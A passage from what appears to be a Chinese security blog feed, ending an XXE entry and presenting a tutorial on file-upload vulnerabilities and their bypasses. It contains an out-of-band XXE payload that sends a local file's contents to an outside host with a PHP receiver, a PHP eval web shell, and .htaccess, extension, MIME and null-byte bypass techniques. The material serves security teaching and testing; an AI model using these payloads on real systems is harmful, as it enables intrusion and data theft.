class="hljs-string">&quot;file:///d:/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://172.25.186.34:8000/test.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;</span><br><span class="hljs-meta">%all;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://172.25.186.34:8000/get.php?file=%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><p>get.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;file.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>WEB攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB攻防</tag>
      
      <tag>XXE漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2024/03/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%F0%9F%93%A1/"/>
    <url>/2024/03/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%F0%9F%93%A1/</url>
    
    <content type="html"><![CDATA[<p>相关优质好文：<a href="https://www.cnblogs.com/backlion/p/13083120.html">https://www.cnblogs.com/backlion/p/13083120.html</a></p><p>优质文档P<sub>95</sub>-P<sub>132</sub>​<a href="assets/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8CWEB%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E-20240402220003-43iej8v.pdf">渗透测试手册WEB安全漏洞.pdf</a></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 <strong>“文件上传”本身没有问题，有问题的是文件上传后，</strong>​**&#x3D;&#x3D;服务器怎么处理、解释文件&#x3D;&#x3D;**​ <strong>。</strong> 如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>上传文件检测流程</p><p><img src="/assets/image-20240402205208-8b7prc0.png" alt="image">​</p><ul><li><p>服务端校验</p><ul><li>文件头content-type字段校验（image&#x2F;gif）</li><li>文件内容头校验（GIF89a）</li><li>目录路经检测（检测跟Path参数相关的内容）</li><li>文件扩展名检测 (检测跟文件 extension 相关的内容)</li><li>后缀名黑名单校验</li><li>后缀名白名单校验</li><li>自定义正则校验</li></ul></li><li><p>WAF设备校验（根据不同的WAF产品而定）</p></li></ul><p>‍</p><p>漏洞产生原因有哪些？</p><ol><li><p>服务器配置不当</p></li><li><p>开源编辑器上传漏洞</p></li><li><p>本地文件上传限制被绕过</p></li><li><p>过滤不严或被绕过</p></li><li><p>文件解析漏洞导致文件执行</p></li><li><p>文件路径截断</p></li></ol><p>‍</p><p>漏洞满足条件是什么？</p><ul><li><p>上传的文件能够被Web容器解释执行（即文件上传后所在目录得是Web容器所覆盖到的路径）</p></li><li><p>用户能够从Web上访问这个文件</p></li></ul><h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><h1 id="漏洞的攻击和防御方式"><a href="#漏洞的攻击和防御方式" class="headerlink" title="漏洞的攻击和防御方式"></a>漏洞的攻击和防御方式</h1><h2 id="前端限制"><a href="#前端限制" class="headerlink" title="前端限制"></a>前端限制</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre><code class="hljs">    **在表单中使用**​`onsumbit=checkFile()`​**调用js函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。**</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;li id=<span class="hljs-string">&quot;show_code&quot;</span>&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>代码<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">code</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;line-numbers language-javascript&quot;</span>&gt;</span>function checkFile() &#123;</span><br><span class="language-xml">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="language-xml">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="language-xml">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="language-xml">        return false;</span><br><span class="language-xml">    &#125;</span><br><span class="language-xml">    //定义允许上传的文件类型</span><br><span class="language-xml">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="language-xml">    //提取上传文件的类型</span><br><span class="language-xml">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="language-xml">    //判断上传文件类型是否允许上传</span><br><span class="language-xml">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span><br><span class="language-xml">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="language-xml">        alert(errMsg);</span><br><span class="language-xml">        return false;</span><br><span class="language-xml">    &#125;</span><br><span class="language-xml">&#125;</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br>&lt;/li&gt;<br></code></pre></td></tr></table></figure><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><ol><li><p>通过火狐插件NOscript插件或者在搜索栏输入<code>about:config</code>​禁用IE中JS脚本</p></li><li><p>通过firebug插件元素审核修改代码，也可以直接F12修改（如删除onsubm:t&#x3D;”return checkFile()”事件）</p></li><li><p>通过firebug元素审核javascirpt脚本中添加上传文件类型。</p></li><li><p>通过利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp&#x2F;php&#x2F;jsp后缀名即可</p></li></ol><p><strong>注意</strong>：这里修改文件名字后，请求头中的<code>Content-Length</code>​的值也要改</p><h2 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h2><p><strong>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传</strong><br>在检查扩展名是否合法的时候，有两种策略：</p><h3 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>文件扩展名在黑名单中的为不合法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//黑名单策略</span><br>&lt;li id=<span class="hljs-string">&quot;show_code&quot;</span>&gt;<br>    &lt;h3&gt;代码&lt;/h3&gt;<br>&lt;pre&gt;<br>&lt;code <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">line</span>-<span class="hljs-title">numbers</span> <span class="hljs-title">language</span>-<span class="hljs-title">php</span>&quot;&gt;$<span class="hljs-title">is_upload</span> = <span class="hljs-title">false</span>;</span><br><span class="hljs-class">$<span class="hljs-title">msg</span> = <span class="hljs-title">null</span>;</span><br><span class="hljs-class"><span class="hljs-title">if</span> (<span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">submit</span>&#x27;])) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;          <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br>&lt;/code&gt;<br>&lt;/pre&gt;<br>&lt;/li&gt;<br></code></pre></td></tr></table></figure><h4 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h4><blockquote><p>Web系统可能会采用黑名单的方式进行过滤。而过滤的方式存在一定的缺陷，比如存在过滤的黑名单不全，未考虑大小写，以及要上传文件的名称存在敏感字符。</p><p>基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。</p><p>使用黑名单过滤方式,肯定会存在缺陷;【对上传文件名称进行敏感字符清除。】</p></blockquote><p>‍</p><p>‍</p><h5 id="特殊解析后缀"><a href="#特殊解析后缀" class="headerlink" title="特殊解析后缀"></a>特殊解析后缀</h5><p>很多语言都存在，有多个可以解析后缀。当目标站点采用黑名单时，往往包含不全面;</p><p>例如:</p><table><thead><tr><th align="center">语言</th><th align="center">默认(服务器)可解析后缀</th><th align="center">盲猜绕过可解析后缀</th></tr></thead><tbody><tr><td align="center">asp.net</td><td align="center">【IIS】</td><td align="center">asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</td></tr><tr><td align="center">php</td><td align="center">​<code>.php .html .htm</code>​【apache】</td><td align="center">php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</td></tr><tr><td align="center">jsp</td><td align="center">​<code>*.jsp</code>​,<code>*.jspx</code>​【tomcat】</td><td align="center">jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</td></tr></tbody></table><p>Tomcat添加可解析后缀名:</p><ul><li><p>路径: apache-tomcat-x.x.x\conf\web.xml</p></li><li><p>文件: web.xml</p></li><li><p>修改位置: <code>&lt;url-pattern&gt;.&lt;/url-pattern&gt;</code>​</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>jsp<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>*.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>*.jspx<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Apache添加可解析后缀名</p><ul><li><p>路径：Apache24\conf\httpd.conf</p></li><li><p>文件：httpd.conf</p></li><li><p>修改位置：<code>AddType</code>​ <code>application/x-httpd-php</code>​ <code>.php</code>​ <code>.html</code>​ <code>.htm</code>​</p></li><li><p>AddType application&#x2F;x-httpd-php .php .html .htm</p></li></ul><p>‍</p><p>‍</p><h5 id="htaccess解析"><a href="#htaccess解析" class="headerlink" title=".htaccess解析"></a>.htaccess解析</h5><p>什么是.htaccess?</p><p>前提条件：Apache开启.htaccess文件功能</p><p>开启方式：</p><ul><li><p>路径：Apache24\conf\httpd.conf</p></li><li><p>文件：httpd.conf</p></li><li><p>位置1：如下代码↓</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs conf">&lt;Directory &quot;$&#123;SRVROOT&#125;/htdocs&quot;&gt; <br>    Options Indexes FollowSymLinks<br>  <br>    AllowOverride None (将None改为ALL)<br>  <br>    Require all granted<br>&lt;/Directory&gt;<br></code></pre></td></tr></table></figure><ul><li><p>位置2: 去掉注释</p></li><li><p><code>#LoadModule rewrite_module modules/mod_rewrite.so</code>​</p></li></ul><p>实际操作:</p><ol><li><p>web站点架构为:php+apache , 保证文件上传到本地 , apache开启对.htaccess支持；</p></li><li><p>黑名单没有过滤.htaccess;</p></li><li><p>编辑.htaccess文件,写入</p></li></ol><blockquote><p>&#x2F;&#x2F;1.这将把目录下的shell.jpg的文件当做可执行的php脚本进行解析并执行。[优先]<br>&lt;FilesMatch “shell.jpg”&gt;<br>  SetHandler application&#x2F;x-httpd-php<br></FilesMatch></p><p>&#x2F;&#x2F;2.上传后缀为.aaa的文件，让其做为php类型文件进行解析<br>AddType application&#x2F;x-httpd-php .aaa</p></blockquote><ol start="4"><li><p>上传一句话木马并以.jpg结尾, 写入 <?php @eval($_POST['pass']);?></p></li><li><p>菜刀或蚁剑连接,完成!</p></li></ol><p>参考：<a href="https://blog.csdn.net/whatiwhere/article/details/84453810">警惕htaccess文件上传解析漏洞_.htaccess重写文件解析绕过-CSDN博客</a></p><p>‍</p><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>背景原因:</p><blockquote><p>后缀名黑名单过滤不全面导致!</p><p>虽然设置了黑名单对常见的后缀进行过滤，但并未对后缀名大小写进行统一。可以利用大小写进行绕过。例如：.phP</p></blockquote><p>示例:</p><ol><li>代码只对后缀名为.php的文件进行了拦截,并未对.pHp后缀名的文件拦截</li><li>上传后缀名为.pHp的文件</li></ol><p>‍</p><h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p>背景原因:(windows特性)</p><ul><li><p>Windows 系统下，文件后缀名最后一个点会被自动去除。</p></li><li><p>Linux 系统下，文件后缀名最后一个点不会被自动去除。</p></li></ul><p>利用 BurpSuite 工具截断 HTTP 请求，上传文件后缀名加 . 绕过上传。</p><p>‍</p><p>使用条件:</p><ul><li>只能在Windows系统下方能生效;</li></ul><p>‍</p><p>利用示例:</p><ul><li>demo.php.【demo(点)php(点)】</li></ul><p>‍</p><p>‍</p><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>背景原因:(windows特性)</p><ul><li><p>Windows系统下，对于文件名中空格【demo.php(空格)】会被作为空处理，程序中的检测代码却不能自动删除空格，从而绕过黑名单。</p></li><li><p>解释： 文件上传功能过滤不完善，没有考虑到空格的情况，将文件【demo.php(空格)】认为是以（空格）结尾的特殊文件，允许上传，当文件成功上传到windows系统下时，因为Windows系统特性会被作为空处理，也就是删除文件最后的空格，结果为【demo.php】</p></li></ul><p>‍</p><p>利用示例:</p><p>通过BurpSuite截断 HTTP 请求之后，在对应的文件后缀名处添加空格。<br>点绕过和空格绕过结合示例如下：↓</p><blockquote><p>例如:<br>    a.php[空格](点)[空格]<br>    a.php .<br>    a.php(点)[空格](点)<br>Windows下：<br>    a.php</p></blockquote><blockquote><p>a.php(点)+空格+(点)</p><p>deldot删除最后一个点之后，不再进行删除，trim删除空格，那么最终上传的文件名为1.php.<br>利用Windows自动去除最后一个点，导致成功上传1.php；</p></blockquote><p>‍</p><p>‍</p><h5 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h5><p>背景原因:(windows特性)</p><ul><li><p>在window系统下，如果上传的文件名为<code>a.php::$DATA</code>​，它会在服务器上生成一个<code>a.php</code>​的文件，其中内容和所上传内容相同，并被解析。</p></li><li><p>例如:<code>phpinfo.php::$DATA</code>​Windows会自动去掉末尾的::$DATA变成<code>phpinfo.php</code>​</p></li></ul><p>‍</p><p>利用示例:</p><ul><li>通过BurpSuite截断 HTTP 请求之后，在对应的文件后缀名处添加::$DATA。</li></ul><blockquote><p>a.php::$DATA</p></blockquote><p>特别说明：</p><blockquote><p>在windows下，无法直接测试::$DATA，因为windows不允许后缀名中存在特殊字符；</p></blockquote><p>‍</p><p>‍</p><h5 id="双写后缀名绕过"><a href="#双写后缀名绕过" class="headerlink" title="双写后缀名绕过"></a>双写后缀名绕过</h5><p>背景原因：</p><ul><li><p>文件上传过滤代码，会将文件名称进行敏感字符清除。</p></li><li><p>文件上传过滤代码，后缀名黑名单过滤不全面导致!</p></li><li><p>例如：如果上传的代码后缀名为.php，那么就将后缀名舍弃；如：a.php——&gt;a；</p></li></ul><p>‍</p><p>利用示例:</p><ul><li><p>对要上传的文件添加重复后缀名，如：a.php——&gt;a.pphphp</p></li><li><p>过滤掉php后，会重新拼接为新的php</p></li></ul><p>‍</p><p>防御措施:</p><p>使用递归循环过滤，不使用一次过滤</p><p>‍</p><h3 id="白名单过滤"><a href="#白名单过滤" class="headerlink" title="白名单过滤"></a>白名单过滤</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><blockquote><p>基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。</p></blockquote><h4 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h5><p>MIME绕过，又叫HTTP请求头中的Content-Type属性绕过;【Response 、Request Headers都存在】</p><blockquote><p>MIME(（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 Image等,后面定义具体的种类。</p></blockquote><p>什么是Content-Type</p><p>要知道什么是Content-Type，首先要了解什么是Internet Media Type。Internet Media Type即互联网媒体类型，也叫做MIME类型，使用两部分标识符来确定一个类型。在HTTP协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息，意思就是说，<strong>Content-Type是Internet Media Type（MIME类型）在HTTP协议中的别称。</strong></p><p>Content-Type的格式</p><blockquote><p>type&#x2F;subtype(;parameter)? type</p><p>上面是Content-Type的格式，可以拆解为三个部分，分别是主类型（type）、子类型（subtype）和参数（parameter）。</p><p>‍</p><p>主类型（type）</p><p>主类型可以是任意的字符串，比如text。如果是*号则代表所有类型。</p><p>‍</p><p>&#x2F;子类型（subtype）</p><p>子类型可以是任意的字符串，比如html。如果是*号则代表所有类型。</p><p>‍</p><p>;参数（parameter）</p><p>参数是可选的，可以在Content-Type中加入一些特殊的参数，比如Accept请求头的参数，常见的有用于设置字符编码的charset参数。</p><p>Content-Type:  <em>&#x2F;</em> ;q&#x3D;0.8,   text&#x2F;html;charset:utf-8;</p></blockquote><p>‍</p><p>‍</p><h6 id="Content-Type中常见的媒体格式类型："><a href="#Content-Type中常见的媒体格式类型：" class="headerlink" title="Content-Type中常见的媒体格式类型："></a>Content-Type中常见的媒体格式类型：</h6><p>以text开头的媒体格式类型：</p><ul><li><p>text&#x2F;html： HTML格式。</p></li><li><p>text&#x2F;plain：纯文本格式。</p></li><li><p>text&#x2F;xml： XML格式。</p></li></ul><p>‍</p><p>以image开头的媒体格式类型：</p><ul><li><p>image&#x2F;gif：gif图片格式。</p></li><li><p>image&#x2F;jpeg：jpg图片格式。</p></li><li><p>image&#x2F;png：png图片格式。</p></li></ul><p>‍</p><p>以application开头的媒体格式类型：</p><ul><li><p>application&#x2F;xhtml+xml：XHTML格式。</p></li><li><p>application&#x2F;xml： XML数据格式。</p></li><li><p>application&#x2F;atom+xml：Atom XML聚合格式 。</p></li><li><p>application&#x2F;json： JSON数据格式。</p></li><li><p>application&#x2F;pdf：pdf格式 。</p></li><li><p>application&#x2F;msword： Word文档格式。</p></li><li><p>application&#x2F;octet-stream： 二进制流数据（如常见的文件下载）。</p></li><li><p>application&#x2F;x-www-form-urlencoded： 中默认的encType，form表单数据被编码为key&#x2F;value格式发送到服务器（表单默认的提交数据的格式）。</p></li></ul><p>‍</p><p>另外还有一种常见的媒体格式是上传文件之时使用的：</p><p>multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式。<br>以上就是我们在日常的开发中，经常会用到的若干Content-Type的内容格式。</p><p>‍</p><p>MIME拦截代码样例:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@Controller</span> <br><span class="hljs-meta">@RequestMapping(value = <span class="hljs-string">&quot;/users&quot;</span>, method = RequestMethod.POST, consumes=<span class="hljs-string">&quot;image/*&quot;</span>)</span> <br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; addUser(<span class="hljs-meta">@RequestBody</span> User userl) &#123;   <br>    <span class="hljs-keyword">return</span> List&lt;User&gt; users;<br>&#125;<br><span class="hljs-comment">//consumes：指定处理请求的提交内容类型（Content-Type），例如application/json、text/html;等。如果不是指定的类型不响应；</span><br><span class="hljs-comment">//上面这个方法【仅处理】请求Content-Type为【image/*】类型的请求。</span><br></code></pre></td></tr></table></figure><p>MIME利用示例：</p><ul><li><p>通过抓包的形式，修改Content-Type类型，将类型指定为：image&#x2F;*</p></li><li><p>Content-Type类型位于HTTP Request 中，要以网站为中心，request表示获取数据，response表示返回数据；</p></li></ul><p>‍</p><p>参考链接：</p><p><a href="https://www.cnblogs.com/yanggb/p/11684494.html">http请求头中的content-type属性 - yanggb - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/shamo89/p/10151968.html">HTTP报文头Accept和Content-Type总结 - 夏威夷8080 - 博客园 (cnblogs.com)</a></p><p>‍</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p> %00跟随url发送到服务器后被服务器解码，这时还没有传到验证函数，也就是说验证函数里接收到的不是%00字符，而是 <strong>%00解码后的内容，即解码成了0x00</strong>。总之就是 <strong>%00被服务器解码为0x00发挥了截断作用</strong>。</p><p>‍</p><p>00截断的核心：</p><p>当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</p><p>‍</p><p>00截断原理：</p><blockquote><ul><li><p>其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:chr（0）</p></li><li><p>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p></li><li><p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</p></li><li><p>‍</p></li><li><p>那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。</p><p>如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？  </p><p>通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了</p></li></ul></blockquote><p>这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。</p><ul><li>php版本要小于5.3.4；5.3.4及以上已经修复该问题</li><li>magic_quotes_gpc需要为OFF状态</li></ul><p>‍</p><p>下面是用 URL 编码形式表示的 ASCII 字符：</p><table><thead><tr><th align="center">URL-encode</th><th align="center">ASCII VALUE</th></tr></thead><tbody><tr><td align="center">%00</td><td align="center">0</td></tr></tbody></table><p>重点：<strong>在url中%00表示ASCII码中的0</strong> 